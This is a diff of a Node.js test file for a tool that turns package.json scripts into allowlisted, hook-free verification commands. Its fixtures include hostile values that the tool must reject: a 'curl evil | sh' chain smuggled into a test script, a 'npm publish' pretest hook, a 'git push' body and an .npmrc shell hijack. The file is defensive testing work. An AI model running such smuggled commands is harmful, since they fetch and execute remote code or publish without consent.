@@ -1,6 +1,10 @@
 import { describe, it, beforeEach, afterEach } from 'node:test';
 import assert from 'node:assert/strict';
-import { mkdtempSync, mkdirSync, rmSync, writeFileSync, readFileSync, readdirSync, symlinkSync } from 'node:fs';
+import {
+  mkdtempSync, mkdirSync, rmSync, writeFileSync, readFileSync, readdirSync, symlinkSync,
+  realpathSync, chmodSync,
+} from 'node:fs';
+import { spawnSync } from 'node:child_process';
 import { tmpdir } from 'node:os';
 import { dirname, join } from 'node:path';
 import { fileURLToPath } from 'node:url';
@@ -23,9 +27,24 @@ import { KIT_WRITER_PREVIEW_TOOLS, UNIVERSAL_READONLY_ALLOWLIST } from './veloci
 const HERE = dirname(fileURLToPath(import.meta.url));
 const GATES_REL = join('docs', 'ai', 'gates.json');
 
+// The Decision-1 exec forms (test-pinned literals — the derivation must emit these EXACTLY). The
+// `COREPACK_ENABLE_NETWORK=0` prefix disables Corepack PM-provisioning fetch (council R3 fold).
+const CN = 'COREPACK_ENABLE_NETWORK=0';
+const NPM_EXEC = (body) => `${CN} npm exec --offline --script-shell /bin/sh -- ${body}`;
+const PNPM_EXEC = (body) => `${CN} pnpm exec -- ${body}`;
+const YARN_EXEC = (body) => `${CN} yarn exec -- ${body}`;
+
+// pnpm/yarn spawn cases skip-if-absent during dev; the release lane provisions all three via
+// corepack and runs them mandatory (Phase 5 of the shipping plan — never ship on skips).
+const canRunPm = (pm) => spawnSync(pm, ['--version'], { encoding: 'utf8' }).status === 0;
+const PNPM_AVAILABLE = canRunPm('pnpm');
+const YARN_AVAILABLE = canRunPm('yarn');
+
 let cwd;
 beforeEach(() => {
-  cwd = mkdtempSync(join(tmpdir(), 'seed-gates-'));
+  // realpath: a fixture cwd under a symlinked OS tmp dir (macOS /tmp -> /private/tmp) must not
+  // trip the Decision-5 symlink-root refusal.
+  cwd = realpathSync(mkdtempSync(join(tmpdir(), 'seed-gates-')));
 });
 afterEach(() => rmSync(cwd, { recursive: true, force: true }));
 
@@ -49,6 +68,40 @@ const quiet = () => {
   return { log: (l) => out.push(String(l)), error: (l) => out.push(String(l)), out };
 };
 
+// An inert body shim in the fixture's node_modules/.bin — the hermetic form of the probe method.
+const writeBinShim = (name, marker) => {
+  const bin = join(cwd, 'node_modules', '.bin');
+  mkdirSync(bin, { recursive: true });
+  writeFileSync(join(bin, name), `#!/bin/sh\necho ${marker} "$@"\n`);
+  chmodSync(join(bin, name), 0o755);
+};
+
+// Spawns a seeded cmd the way the gate runner does (ONE bash line from the project root). npm's
+// cache AND global prefix are ISOLATED per fixture: `npm exec --offline` falls back to the host's
+// GLOBAL tree before the cache (host-proven), so without the prefix isolation a globally-installed
+// runner would make the no-fetch cases flaky. pnpm/yarn resolve a runner from PATH as a last
+// resort — PATH cannot be surgically stripped (the PMs and node live in the same bin dir as
+// global packages), so the lanes that need an ABSENT runner skip loudly when it is PATH-resolvable.
+const spawnSeeded = (cmd, dir = cwd, { isolatePrefix = true } = {}) =>
+  spawnSync('bash', ['-c', cmd], {
+    cwd: dir,
+    encoding: 'utf8',
+    timeout: 120_000,
+    env: {
+      ...process.env,
+      npm_config_cache: join(dir, '.isolated-npm-cache'),
+      ...(isolatePrefix ? { npm_config_prefix: join(dir, '.isolated-npm-prefix') } : {}),
+    },
+  });
+
+const onPath = (bin) => spawnSync('bash', ['-c', `command -v ${bin}`], { encoding: 'utf8' }).status === 0;
+
+const seededCmdOf = (id = 'test') => {
+  const entry = deriveScriptEntries(cwd).find((e) => e.id === id);
+  assert.ok(entry, `the "${id}" entry must be offered`);
+  return entry.cmd;
+};
+
 // ── derivation invariants (LOCKED in the plan) ────────────────────────────────────────
 
 describe('seed-gates — derivation: warn-flagged candidates NEVER enter the offer', () => {
@@ -65,7 +118,8 @@ describe('seed-gates — derivation: warn-flagged candidates NEVER enter the off
 describe('seed-gates — derivation: only TERMINATING verification classes are offered', () => {
   it('test/lint/type-check/build classes are offered; dev/start/watch/serve/preview and formatter write-mode are not', () => {
     mkProject({ scripts: {
-      test: 'node --test', 'test:unit': 'x', lint: 'x', typecheck: 'x', 'type-check': 'x', build: 'x', 'build:prod': 'x',
+      test: 'node --test', 'test:unit': 'node --test', lint: 'eslint .', typecheck: 'tsc --noEmit',
+      'type-check': 'tsc -p . --noEmit', build: 'vite build', 'build:prod': 'vite build',
       dev: 'x', start: 'x', serve: 'x', preview: 'x', 'test:watch': 'x', watch: 'x', format: 'prettier -w .', prettier: 'x',
     } });
     const ids = deriveScriptEntries(cwd).map((e) => e.id).sort();
@@ -82,16 +136,16 @@ describe('seed-gates — derivation: only TERMINATING verification classes are o
     } });
     const entries = deriveScriptEntries(cwd);
     assert.deepEqual(entries.map((e) => e.id), ['test'], 'only the shell-safe script name survives');
-    assert.deepEqual(entries.map((e) => e.cmd), ['npm run test']);
+    assert.deepEqual(entries.map((e) => e.cmd), [NPM_EXEC('node --test')]);
   });
 
-  it('a WATCH/SERVE body never enters the offer — the terminating contract screens bodies too (vitest --watch, vite build --watch)', () => {
+  it('a WATCH/SERVE body never enters the offer — non-membership in the closed-world allowlist screens it', () => {
     mkProject({ scripts: {
       test: 'vitest --watch',
       build: 'vite build --watch',
       'test:ci': 'vitest run',
       lint: 'eslint . --serve', // pathological, still a non-terminating body flag
-      typecheck: 'tsc -p .',
+      typecheck: 'tsc --noEmit',
     } });
     const ids = deriveScriptEntries(cwd).map((e) => e.id).sort();
     assert.deepEqual(ids, ['test-ci', 'typecheck'], 'watch/serve bodies are screened out, terminating bodies stay');
@@ -104,23 +158,23 @@ describe('seed-gates — derivation: only TERMINATING verification classes are o
       build: 'npm run deploy',
       'build:site': 'git push origin main',
       'test:real': 'node --test',
-      typecheck: 'tsc -p .',
+      typecheck: 'tsc --noEmit',
     } });
     const ids = deriveScriptEntries(cwd).map((e) => e.id).sort();
     assert.deepEqual(ids, ['test-real', 'typecheck'], 'dangerous body tokens disqualify regardless of the clean name');
   });
 
-  it('non-terminating tokens are screened in ANY name segment and as BARE body subcommands (build:preview → vite preview)', () => {
+  it('non-terminating tokens are screened in ANY name segment; a non-member body (vite preview) never enters', () => {
     mkProject({ scripts: {
       'build:preview': 'vite preview',
       'test:serve': 'serve report',
       'lint:dev': 'eslint .',
-      build: 'vite preview', // terminating name, bare non-terminating body subcommand
+      build: 'vite preview', // terminating name, non-terminating (and non-member) body
       'build:prod': 'vite build',
       test: 'node --test',
     } });
     const ids = deriveScriptEntries(cwd).map((e) => e.id).sort();
-    assert.deepEqual(ids, ['build-prod', 'test'], 'mid-name segments and bare body words both disqualify');
+    assert.deepEqual(ids, ['build-prod', 'test'], 'mid-name segments and non-member bodies both disqualify');
   });
 
   it('a MUTATING VARIANT of a terminating class never enters the offer — by name (lint:fix, test:update) or by body (--fix/--write/-w/-u)', () => {
@@ -134,7 +188,7 @@ describe('seed-gates — derivation: only TERMINATING verification classes are o
       test: 'jest -u',
       'test:snapshot': 'jest',
       typecheck: 'tsc -w',
-      build: 'tsc -p .',
+      build: 'vite build',
       'lint:ci': 'eslint .',
     } });
     const ids = deriveScriptEntries(cwd).map((e) => e.id).sort();
@@ -142,18 +196,7 @@ describe('seed-gates — derivation: only TERMINATING verification classes are o
   });
 });
 
-describe('seed-gates — derivation: package-manager-aware commands (never hardcoded npm run)', () => {
-  it('pnpm-lock.yaml → pnpm run; yarn.lock → yarn run; default npm run; packageManager field wins', () => {
-    mkProject({ scripts: { test: 'x' }, lockfile: 'pnpm-lock.yaml' });
-    assert.equal(detectPackageManager(cwd), 'pnpm');
-    assert.equal(deriveScriptEntries(cwd)[0].cmd, 'pnpm run test');
-    rmSync(join(cwd, 'pnpm-lock.yaml'));
-    writeFileSync(join(cwd, 'yarn.lock'), '');
-    assert.equal(deriveScriptEntries(cwd)[0].cmd, 'yarn run test');
-    rmSync(join(cwd, 'yarn.lock'));
-    assert.equal(deriveScriptEntries(cwd)[0].cmd, 'npm run test');
-  });
-
+describe('seed-gates — derivation: package-manager detection (the cmd-shape pins live in T4)', () => {
   it('the package.json packageManager field beats the lockfile probe', () => {
     mkProject({ scripts: { test: 'x' }, lockfile: 'yarn.lock', packageManager: 'pnpm@9.0.0' });
     assert.equal(detectPackageManager(cwd), 'pnpm');
@@ -164,9 +207,312 @@ describe('seed-gates — derivation: kebab-case ids that pass the runner validat
   it('build:prod → build-prod; every derived entry validates as a full declaration', () => {
     assert.equal(kebabIdOf('build:prod'), 'build-prod');
     assert.equal(kebabIdOf('Test_E2E'), 'test-e2e');
-    mkProject({ scripts: { 'build:prod': 'x', 'test.integration': 'x', lint: 'x' } });
+    mkProject({ scripts: { 'build:prod': 'vite build', 'test.integration': 'node --test', lint: 'eslint .' } });
     const entries = deriveScriptEntries(cwd);
     assert.deepEqual(validateDeclaration({ gates: entries }), entries, 'the derived entries ARE a valid declaration');
+  });
+});
+
+// ── T1: lifecycle-structural via exec (Issue-011 residual 1) ──────────────────────────
+
+describe('seed-gates — T1 lifecycle hooks die structurally: the offer is the hook-free exec form', () => {
+  it('a hostile pretest sibling cannot ride a clean test name — the derived cmd is the exact npm exec form (derivation only, never spawns)', () => {
+    mkProject({ scripts: { pretest: 'npm publish', test: 'node --test' } });
+    const entries = deriveScriptEntries(cwd);
+    assert.deepEqual(entries.map((e) => e.id), ['test'], 'the pre-hook sibling itself is warn-excluded');
+    assert.equal(entries[0].cmd, NPM_EXEC('node --test'));
+  });
+
+  const mkHookedFixture = (lockfile) => {
+    mkProject({ scripts: { pretest: 'echo SEED_T1_PRE', test: 'jest', posttest: 'echo SEED_T1_POST' }, lockfile });
+    writeBinShim('jest', 'SEED_T1_BODY');
+  };
+  const assertHookFreeRun = () => {
+    const r = spawnSeeded(seededCmdOf('test'));
+    const out = `${r.stdout}\n${r.stderr}`;
+    assert.equal(r.status, 0, out);
+    assert.match(out, /SEED_T1_BODY/, 'positive control — the body shim actually ran');
+    assert.doesNotMatch(out, /SEED_T1_PRE|SEED_T1_POST/, 'no lifecycle hook fired');
+  };
+
+  it('behavioral spawn proof (npm): the body shim runs, pre/post markers never fire, exit 0', () => {
+    mkHookedFixture(undefined);
+    assertHookFreeRun();
+  });
+
+  it('behavioral spawn proof (pnpm)', { skip: !PNPM_AVAILABLE }, () => {
+    mkHookedFixture('pnpm-lock.yaml');
+    assertHookFreeRun();
+  });
+
+  it('behavioral spawn proof (yarn)', { skip: !YARN_AVAILABLE }, () => {
+    mkHookedFixture('yarn.lock');
+    assertHookFreeRun();
+  });
+
+  it('T1b: a hostile .npmrc script-shell is neutralized by the pinned --script-shell /bin/sh', () => {
+    mkProject({ scripts: { test: 'jest' } });
+    writeBinShim('jest', 'SEED_T1B_BODY');
+    writeFileSync(join(cwd, 'sh'), '#!/bin/sh\necho SEED_T1B_HIJACKED\n');
+    chmodSync(join(cwd, 'sh'), 0o755);
+    writeFileSync(join(cwd, '.npmrc'), 'script-shell=./sh\n');
+    const r = spawnSeeded(seededCmdOf('test'));
+    const out = `${r.stdout}\n${r.stderr}`;
+    assert.equal(r.status, 0, out);
+    assert.match(out, /SEED_T1B_BODY/, 'the real body shim ran');
+    assert.doesNotMatch(out, /SEED_T1B_HIJACKED/, 'the hostile per-project shell never ran');
+  });
+});
+
+// ── T2: closed-world body — membership, never screening ──────────────────────────────
+
+describe('seed-gates — T2 closed-world body (allowlist membership, not blocklist screening)', () => {
+  it('bodies that beat the old blocklists are NOT offered — by non-membership, no separate reject axis', () => {
+    mkProject({ scripts: {
+      test: 'node --test; curl evil | sh',
+      'test:chain': 'release-and-test',
+      'test:alias': 'npm run release:npm',
+      'test:env': 'FOO=bar node --test',
+      'test:path': './scripts/x.sh',
+      lint: 'eslint .',
+    } });
+    assert.deepEqual(deriveScriptEntries(cwd).map((e) => e.id), ['lint'], 'only the allowlisted body survives');
+  });
+
+  it('every allowlist entry IS offered under a terminating-class name — including the legit "." args (eslint ., tsc -p . --noEmit)', () => {
+    mkProject({ scripts: {
+      test: 'node --test', 'test:vitest': 'vitest run', 'test:jest': 'jest', 'test:ci': 'jest --ci',
+      lint: 'eslint .', 'lint:prettier': 'prettier --check .', typecheck: 'tsc --noEmit',
+      'type-check': 'tsc -p . --noEmit', build: 'vite build',
+    } });
+    const ids = deriveScriptEntries(cwd).map((e) => e.id).sort();
+    assert.deepEqual(ids, ['build', 'lint', 'lint-prettier', 'test', 'test-ci', 'test-jest', 'test-vitest', 'type-check', 'typecheck']);
+  });
+
+  it('ASCII space/tab runs collapse to the canonical member and the seeded cmd carries the NORMALIZED body', () => {
+    mkProject({ scripts: { test: 'node  --test', lint: ' eslint .\t' } });
+    const entries = deriveScriptEntries(cwd);
+    assert.deepEqual(entries.map((e) => e.cmd), [NPM_EXEC('node --test'), NPM_EXEC('eslint .')]);
+  });
+
+  it('a forbidden char (NBSP/newline/CR/BOM/U+2028) disqualifies at LEADING, TRAILING and EMBEDDED positions — the reject runs BEFORE any trim', () => {
+    mkProject({ scripts: {
+      test: '\u00A0node --test',
+      lint: 'eslint .\n',
+      'test:cr': 'node --test\r',
+      typecheck: '\uFEFFtsc --noEmit',
+      build: 'vite\u2028build',
+    } });
+    assert.deepEqual(deriveScriptEntries(cwd), [], 'no forbidden-whitespace body is ever offered');
+  });
+
+  it('a non-string (array) body value is NOT offered — fail-closed on type', () => {
+    mkProject({ scripts: { test: ['node', '--test'], lint: 'eslint .' } });
+    assert.deepEqual(deriveScriptEntries(cwd).map((e) => e.id), ['lint']);
+  });
+});
+
+// ── T3: allowlist self-safety (guards the PRODUCTION export, not a test duplicate) ────
+
+describe('seed-gates — T3 allowlist self-safety (criterion ii: an unsafe future edit fails here)', () => {
+  it('every production allowlist entry is a normalized, metacharacter-free, non-writing invocation of a recognized runner stem', async () => {
+    const mod = await import('./seed-gates.mjs');
+    const { BODY_ALLOWLIST, HOST_RUNTIME_STEMS, PACKAGE_RUNNER_STEMS } = mod;
+    assert.ok(Array.isArray(BODY_ALLOWLIST) && BODY_ALLOWLIST.length > 0, 'the PRODUCTION allowlist export exists');
+    assert.ok(Array.isArray(HOST_RUNTIME_STEMS) && Array.isArray(PACKAGE_RUNNER_STEMS), 'the stem partition is exported');
+    assert.equal(new Set(BODY_ALLOWLIST).size, BODY_ALLOWLIST.length, 'entries are unique');
+    for (const entry of BODY_ALLOWLIST) {
+      assert.equal(typeof entry, 'string', `string literal: ${entry}`);
+      assert.ok(entry.length > 0, 'non-empty');
+      assert.match(entry, /^[A-Za-z0-9 .-]+$/, `no shell metacharacter, quoting, or non-ASCII: ${entry}`);
+      assert.doesNotMatch(entry, /(^|\s)(--fix|--write|-w|-u|--update\S*)(\s|$)/, `no write-mode flag: ${entry}`);
+      const stem = entry.split(' ')[0];
+      assert.ok(
+        HOST_RUNTIME_STEMS.includes(stem) || PACKAGE_RUNNER_STEMS.includes(stem),
+        `recognized runner stem (host-runtime or package-runner): ${stem}`,
+      );
+      assert.equal(entry, entry.trim().replace(/[ \t]+/g, ' '), `already in normal form: ${entry}`);
+    }
+    const stems = [...HOST_RUNTIME_STEMS, ...PACKAGE_RUNNER_STEMS];
+    assert.equal(new Set(stems).size, stems.length, 'the stem partition is disjoint');
+  });
+});
+
+// ── T4: per-PM exec forms + builder fail-closed + detector characterization ───────────
+
+describe('seed-gates — T4 per-PM exec forms (uniform, hook-free, -- separated)', () => {
+  it('npm / pnpm / yarn projects each get their exact Decision-1 exec form', () => {
+    mkProject({ scripts: { test: 'node --test' } });
+    assert.equal(deriveScriptEntries(cwd)[0].cmd, NPM_EXEC('node --test'));
+    writeFileSync(join(cwd, 'pnpm-lock.yaml'), '');
+    assert.equal(deriveScriptEntries(cwd)[0].cmd, PNPM_EXEC('node --test'));
+    rmSync(join(cwd, 'pnpm-lock.yaml'));
+    writeFileSync(join(cwd, 'yarn.lock'), '');
+    assert.equal(deriveScriptEntries(cwd)[0].cmd, YARN_EXEC('node --test'));
+  });
+
+  it('every per-PM exec form carries the COREPACK_ENABLE_NETWORK=0 prefix (no Corepack PM-provision fetch under an auto-approved gate)', async () => {
+    const { execCmdFor } = await import('./seed-gates.mjs');
+    for (const pm of ['npm', 'pnpm', 'yarn']) {
+      assert.match(execCmdFor(pm, 'node --test').cmd, /^COREPACK_ENABLE_NETWORK=0 /, `${pm} form disables Corepack network`);
+    }
+  });
+
+  it('the review-state/review-ledger candidates are still offered under any PM (the slot rule is PM-independent)', () => {
+    mkProject({
+      scripts: { test: 'node --test' },
+      lockfile: 'pnpm-lock.yaml',
+      config: { 'plan-execution': { review: 'council' } },
+    });
+    assert.deepEqual(buildOffer(cwd).entries.map((e) => e.id), ['test', 'review-state', 'review-ledger']);
+  });
+
+  it('T4b: the cmd builder fails CLOSED on an unknown pm family — withhold with a loud note, never any run form', async () => {
+    const { execCmdFor } = await import('./seed-gates.mjs');
+    assert.equal(typeof execCmdFor, 'function', 'the PRODUCTION builder export exists');
+    const r = execCmdFor('bun', 'node --test');
+    assert.equal(r.cmd, null, 'no cmd for an unverified family');
+    assert.match(r.note, /package manager/i, 'the note is version-neutral and names the axis');
+    assert.match(r.note, /by hand/, 'the note carries the hand-add recovery');
+    // The derive layer inherits the builder's fail-closed rule: an injected unknown family
+    // withholds every script entry and says so in the offer notes.
+    mkProject({ scripts: { test: 'node --test' } });
+    assert.deepEqual(deriveScriptEntries(cwd, { packageManager: 'bun' }), []);
+    const offer = buildOffer(cwd, { packageManager: 'bun' });
+    assert.ok(
+      offer.notes.some((n) => /withheld/.test(n) && /\btest\b/.test(n) && /by hand/.test(n)),
+      `the withheld ids are named loudly: ${offer.notes.join(' | ')}`,
+    );
+  });
+
+  it('T4c: detectPackageManager collapses bun → npm today (KNOWN behavior, characterized)', () => {
+    mkProject({ scripts: {}, packageManager: 'bun@1' });
+    assert.equal(detectPackageManager(cwd), 'npm', 'a bun packageManager field falls back to npm');
+    writeFileSync(join(cwd, 'package.json'), JSON.stringify({ name: 'fixture', scripts: {} }));
+    writeFileSync(join(cwd, 'bun.lockb'), '');
+    assert.equal(detectPackageManager(cwd), 'npm', 'bun.lockb is not probed');
+  });
+});
+
+describe('seed-gates — T4d per-PM no-network fail-closed (missing package-runner)', () => {
+  it('npm: --offline + an ISOLATED empty cache → the missing runner is refused as a cache miss, never fetched', () => {
+    mkProject({ scripts: { test: 'vitest run' } });
+    const r = spawnSeeded(seededCmdOf('test'));
+    const out = `${r.stdout}\n${r.stderr}`;
+    assert.notEqual(r.status, 0, 'fail-closed');
+    assert.match(out, /ENOTCACHED|only-if-cached/, `offline cache-miss refusal, not a fetch: ${out}`);
+  });
+
+  // pnpm/yarn fall back to PATH resolution, so these two lanes need vitest ABSENT from PATH —
+  // they skip loudly (never lie) on a host with a global vitest. The refusal oracle matches the
+  // RUNNER-NOT-FOUND signature class — which varies by PM version (`spawn … EACCES/ENOENT`,
+  // pnpm's `ERR_PNPM…`/`EACCES`, yarn 1.22.19 `spawn … EACCES` vs 1.22.22 `Couldn't find the
+  // binary`) but is disjoint from the executed-and-failed `Command failed / Exit code: N` string a
+  // runner that ran-then-failed would print (the codex R1 wrong-path admission we must exclude).
+  const NOT_FOUND = /Couldn't find the binary|command not found|no such file|EACCES|ENOENT|ERR_PNPM/i;
+  it('pnpm: a missing runner fails closed locally, no network', { skip: !PNPM_AVAILABLE || onPath('vitest') }, () => {
+    mkProject({ scripts: { test: 'vitest run' }, lockfile: 'pnpm-lock.yaml' });
+    const r = spawnSeeded(seededCmdOf('test'));
+    assert.notEqual(r.status, 0, 'fail-closed');
+    assert.match(`${r.stdout}\n${r.stderr}`, NOT_FOUND, 'a runner-not-found refusal, never an executed-and-failed runner');
+  });
+
+  it('yarn: a missing runner fails closed locally, no network', { skip: !YARN_AVAILABLE || onPath('vitest') }, () => {
+    mkProject({ scripts: { test: 'vitest run' }, lockfile: 'yarn.lock' });
+    const r = spawnSeeded(seededCmdOf('test'));
+    assert.notEqual(r.status, 0, 'fail-closed');
+    const out = `${r.stdout}\n${r.stderr}`;
+    assert.match(out, NOT_FOUND, 'a runner-not-found refusal, never an executed-and-failed runner');
+    assert.doesNotMatch(out, /Command failed\.?\s*\n?\s*Exit code:/i, 'must not be the yarn executed-and-failed signature');
+  });
+
+  it('a host-runtime body (node --test) needs no local bin: still offered, still runs (the partition must not withhold node)', () => {
+    mkProject({ scripts: { test: 'node --test' } });
+    writeFileSync(join(cwd, 'smoke.test.mjs'), "import { test } from 'node:test';\ntest('ok', () => {});\n");
+    // No prefix isolation here: npm exec resolves `node` through the host's real npm prefix
+    // (node's own install bin — nvm/brew/apt all ship node there), exactly as on a real host;
+    // an isolated empty prefix would be an artificial environment stricter than any real one.
+    const r = spawnSeeded(seededCmdOf('test'), cwd, { isolatePrefix: false });
+    assert.equal(r.status, 0, `${r.stdout}\n${r.stderr}`);
+  });
+});
+
+// ── T5: leading-dash name (ALWAYS-GREEN characterization) ─────────────────────────────
+
+describe('seed-gates — T5 a leading-dash script name never enters the offer', () => {
+  it('the ^-anchored terminating-class pattern makes "-test" unreachable (characterized)', () => {
+    mkProject({ scripts: { '-test': 'node --test', test: 'node --test' } });
+    assert.deepEqual(deriveScriptEntries(cwd).map((e) => e.id), ['test']);
+  });
+});
+
+// ── T6: offer honesty — screened-out scripts are named, the residual is disclosed ─────
+
+describe('seed-gates — T6 offer honesty (nothing screened out silently)', () => {
+  it('gate-class-named scripts with non-allowlisted bodies are counted and named (ids) in a preview note with the hand-add pointer', () => {
+    mkProject({ scripts: { test: 'mocha', 'test:e2e': 'playwright test', lint: 'eslint .' } });
+    const io = quiet();
+    assert.equal(main(['--cwd', cwd], io), 0);
+    const text = io.out.join('\n');
+    assert.match(text, /eslint \./, 'the allowlisted entry is offered');
+    assert.match(text, /2 .*screened out/, 'the screened-out scripts are counted');
+    assert.match(text, /test, test-e2e/, 'the screened-out scripts are named by id');
+    assert.match(text, /by hand/, 'the hand-add recovery is stated');
+  });
+
+  it('the trust-chain disclosure carries the runtime-residual sentence (Decision 6)', () => {
+    mkProject({ scripts: { test: 'node --test' } });
+    const io = quiet();
+    assert.equal(main(['--cwd', cwd], io), 0);
+    const text = io.out.join('\n');
+    assert.match(text, /project-controlled code/, 'the residual names what actually runs');
+    assert.match(text, /does not sandbox/, 'the non-claim is explicit');
+  });
+
+  it('the --apply SUCCESS path still carries the screened-out note — a mixed offer never silently omits the screened script', () => {
+    mkProject({ scripts: { test: 'mocha', lint: 'eslint .' } });
+    const io = quiet();
+    assert.equal(main(['--cwd', cwd, '--apply'], io), 0);
+    const text = io.out.join('\n');
+    assert.match(text, /appended 1 consented gate\(s\).*lint/, 'the allowlisted entry was applied');
+    assert.match(text, /screened out/, 'the note survives onto the apply-success path');
+    assert.match(text, /\btest\b/, 'the screened-out id is named');
+    assert.deepEqual(loadDeclaration(cwd).gates.map((g) => g.id), ['lint']);
+  });
+
+  it('the --apply "nothing to offer" path carries the same screened-out note (the user learns WHY)', () => {
+    mkProject({ scripts: { test: 'mocha' } });
+    const io = quiet();
+    assert.equal(main(['--cwd', cwd, '--apply'], io), 0);
+    const text = io.out.join('\n');
+    assert.match(text, /nothing to offer/i);
+    assert.match(text, /screened out/, 'the note appears on the apply path too');
+    assert.match(text, /\btest\b/, 'the screened-out id is named');
+    assert.match(text, /by hand/);
+    assert.equal(readdirSync(join(cwd, 'docs', 'ai')).includes('gates.json'), false, 'nothing written');
+  });
+});
+
+// ── T7: preflight parent-chain (Issue-011 residual 3) — seeder-level integration ──────
+
+describe('seed-gates — T7 a symlinked docs PARENT is a preflight STOP on preview AND apply', () => {
+  it('preview and apply both STOP (exit 1) naming the symlinked component, before any read', () => {
+    const root = realpathSync(mkdtempSync(join(tmpdir(), 'seed-gates-symlink-')));
+    try {
+      mkdirSync(join(root, 'target', 'ai'), { recursive: true });
+      writeFileSync(join(root, 'target', 'ai', '.workflow-version'), '2.0.0\n');
+      writeFileSync(join(root, 'package.json'), JSON.stringify({ name: 'fixture', scripts: { test: 'node --test' } }));
+      symlinkSync(join(root, 'target'), join(root, 'docs'));
+      const preview = quiet();
+      assert.equal(main(['--cwd', root], preview), 1, preview.out.join('\n'));
+      assert.match(preview.out.join('\n'), /symlink/, 'the STOP names the symlink');
+      assert.match(preview.out.join('\n'), /docs/, 'the STOP names the component');
+      const apply = quiet();
+      assert.equal(main(['--cwd', root, '--apply'], apply), 1);
+      assert.match(apply.out.join('\n'), /symlink/);
+    } finally {
+      rmSync(root, { recursive: true, force: true });
+    }
   });
 });
 
@@ -244,14 +590,14 @@ describe('seed-gates — the review-ledger candidate keys on the same slot (AD-0
 
 describe('seed-gates — preview is the default and writes NOTHING', () => {
   it('dry-run leaves an existing gates.json byte-identical and prints the derived entries + the trust-chain disclosure', () => {
-    mkProject({ scripts: { test: 'x' }, gates: { _README: 'mine', gates: [{ id: 'own', title: 'Own', cmd: 'true' }] } });
+    mkProject({ scripts: { test: 'node --test' }, gates: { _README: 'mine', gates: [{ id: 'own', title: 'Own', cmd: 'true' }] } });
     const before = gatesRaw();
     const io = quiet();
     const code = main(['--cwd', cwd], io);
     assert.equal(code, 0);
     assert.equal(gatesRaw(), before, 'dry-run must be byte-identical');
     const text = io.out.join('\n');
-    assert.match(text, /npm run test/, 'the preview names the derived cmd');
+    assert.ok(text.includes(NPM_EXEC('node --test')), 'the preview names the derived exec cmd');
     assert.ok(text.includes(TRUST_CHAIN_DISCLOSURE), 'the preview carries the trust-chain disclosure');
     assert.match(text, /auto-approves byte-exact declared gate commands/, 'the hook implication is stated');
     assert.match(text, /two separate yeses/, 'the two-consent boundary is stated');
@@ -261,7 +607,7 @@ describe('seed-gates — preview is the default and writes NOTHING', () => {
   });
 
   it('a dry-run with --only prints an apply hint carrying EXACTLY those --only flags (the hint never widens the previewed consent)', () => {
-    mkProject({ scripts: { test: 'x', lint: 'x' } });
+    mkProject({ scripts: { test: 'node --test', lint: 'eslint .' } });
     const io = quiet();
     assert.equal(main(['--cwd', cwd, '--only', 'test'], io), 0);
     const text = io.out.join('\n');
@@ -275,7 +621,7 @@ describe('seed-gates — preview is the default and writes NOTHING', () => {
     try {
       mkdirSync(join(evil, 'docs', 'ai'), { recursive: true });
       writeFileSync(join(evil, 'docs', 'ai', '.workflow-version'), '2.0.0\n');
-      writeFileSync(join(evil, 'package.json'), JSON.stringify({ scripts: { test: 'x' } }));
+      writeFileSync(join(evil, 'package.json'), JSON.stringify({ scripts: { test: 'node --test' } }));
       const io = quiet();
       assert.equal(main(['--cwd', evil, '--dry-run'], io), 0);
       const text = io.out.join('\n');
@@ -287,7 +633,7 @@ describe('seed-gates — preview is the default and writes NOTHING', () => {
   });
 
   it('docs/ai presence is required on EVERY run — a dry-run outside a deployment is a STOP', () => {
-    writeFileSync(join(cwd, 'package.json'), JSON.stringify({ scripts: { test: 'x' } }));
+    writeFileSync(join(cwd, 'package.json'), JSON.stringify({ scripts: { test: 'node --test' } }));
     const io = quiet();
     const code = main(['--cwd', cwd], io);
     assert.equal(code, 1, 'no docs/ai → precondition STOP even on dry-run');
@@ -300,7 +646,7 @@ describe('seed-gates — preview is the default and writes NOTHING', () => {
 describe('seed-gates — --apply appends exactly the consented entries', () => {
   it('appends the --only subset after the existing entries; existing entries stay unmodified; result validates', () => {
     const own = { id: 'own', title: 'Own', cmd: 'true' };
-    mkProject({ scripts: { test: 'x', lint: 'x', build: 'x' }, gates: { _README: 'mine', gates: [own] } });
+    mkProject({ scripts: { test: 'node --test', lint: 'eslint .', build: 'vite build' }, gates: { _README: 'mine', gates: [own] } });
     const io = quiet();
     const code = main(['--cwd', cwd, '--apply', '--only', 'test', '--only', 'lint'], io);
     assert.equal(code, 0, io.out.join('\n'));
@@ -312,7 +658,7 @@ describe('seed-gates — --apply appends exactly the consented entries', () => {
   });
 
   it('a missing gates.json is seeded from the kit template (_README present) + the consented entries', () => {
-    mkProject({ scripts: { test: 'x' } });
+    mkProject({ scripts: { test: 'node --test' } });
     const io = quiet();
     const code = main(['--cwd', cwd, '--apply'], io);
     assert.equal(code, 0, io.out.join('\n'));
@@ -322,7 +668,7 @@ describe('seed-gates — --apply appends exactly the consented entries', () => {
   });
 
   it('an id collision is REFUSED loudly; the file stays byte-identical', () => {
-    mkProject({ scripts: { test: 'x' }, gates: { gates: [{ id: 'test', title: 'Mine', cmd: 'true' }] } });
+    mkProject({ scripts: { test: 'node --test' }, gates: { gates: [{ id: 'test', title: 'Mine', cmd: 'true' }] } });
     const before = gatesRaw();
     const io = quiet();
     const code = main(['--cwd', cwd, '--apply'], io);
@@ -332,7 +678,7 @@ describe('seed-gates — --apply appends exactly the consented entries', () => {
   });
 
   it('a MALFORMED existing declaration is a STOP — never written over', () => {
-    mkProject({ scripts: { test: 'x' }, gates: '{ not json' });
+    mkProject({ scripts: { test: 'node --test' }, gates: '{ not json' });
     const before = gatesRaw();
     const io = quiet();
     assert.equal(main(['--cwd', cwd, '--apply'], io), 1);
@@ -340,14 +686,14 @@ describe('seed-gates — --apply appends exactly the consented entries', () => {
   });
 
   it('the stamp gate holds on --apply ONLY: a missing/foreign stamp blocks apply but not the preview', () => {
-    mkProject({ scripts: { test: 'x' }, stamp: '9.9.9' });
+    mkProject({ scripts: { test: 'node --test' }, stamp: '9.9.9' });
     const io = quiet();
     assert.equal(main(['--cwd', cwd], io), 0, 'preview works on any deployment');
     assert.equal(main(['--cwd', cwd, '--apply'], quiet()), 1, 'apply is deployment-stamp-gated');
   });
 
   it('a SYMLINKED gates.json leaf is a STOP — the link target is untouched (the atomic-core discipline)', () => {
-    mkProject({ scripts: { test: 'x' } });
+    mkProject({ scripts: { test: 'node --test' } });
     const target = join(cwd, 'elsewhere.json');
     writeFileSync(target, 'SECRET');
     symlinkSync(target, join(cwd, GATES_REL));
